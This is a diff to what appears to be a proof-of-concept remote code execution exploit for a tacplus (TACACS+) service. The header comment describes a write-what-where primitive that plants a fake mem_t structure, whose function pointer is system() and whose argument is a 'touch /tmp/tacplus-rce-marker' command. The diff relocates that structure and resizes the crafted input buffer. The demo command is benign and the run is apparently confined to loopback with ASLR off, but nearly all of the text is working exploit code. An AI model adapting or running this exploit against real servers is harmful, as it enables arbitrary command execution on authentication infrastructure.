@@ -5,9 +5,9 @@ Uses the measured W129 `t`-slot write-what-where:
   i=12: l=140 -> copy 136 transit bytes, t: 32 -> 168 (the `t` slot)
   i=13: l=12  -> write &session->mem-8 into the `t` slot (t <- &session->mem)
   i=14: l=12  -> write the fake mem_t address into &session->mem
-The fake mem_t sits in the prime pattern at byte offset 200 (in+1356):
-  {u.list=0, type=0, arr_count=1, arr=in+1388}
-  arr[0] = {f=system, p=in+1404}  and  in+1404 = "touch /tmp/tacplus-rce-marker"
+The fake mem_t sits in the prime pattern at byte offset 700 (in+1856):
+  {u.list=0, type=0, arr_count=1, arr=in+1888}
+  arr[0] = {f=system, p=in+1904}  and  in+1904 = "touch /tmp/tacplus-rce-marker"
 type 0 skips memlist/mempool destroy; mem_destroy calls arr[0].f(arr[0].p)
 before its two invalid frees. Gdb-disabled ASLR makes the addresses stable.
 No off-loopback traffic.
@@ -85,7 +85,8 @@ def main():
     in_addr = int(a.in_addr, 16)
     pattern_base = in_addr + 1156
     smem_slot = in_addr + 0xa8
-    fake_off, arr_off, cmd_off = 200, 232, 248
+    fake_off, arr_off, cmd_off = 700, 732, 748
+    pattern = bytearray(b"X" * 820)
     fake_addr = pattern_base + fake_off
     arr_addr = pattern_base + arr_off
     cmd_addr = pattern_base + cmd_off
@@ -98,7 +99,6 @@ def main():
     transit[104:112] = smem_slot.to_bytes(8, "little")
     transit[128:136] = (12).to_bytes(8, "little")
 
-    pattern = bytearray(b"X" * 400)
     pattern[0:4] = b"cmd="
     pattern[4:140] = transit
     pattern[140:144] = b"cmd="
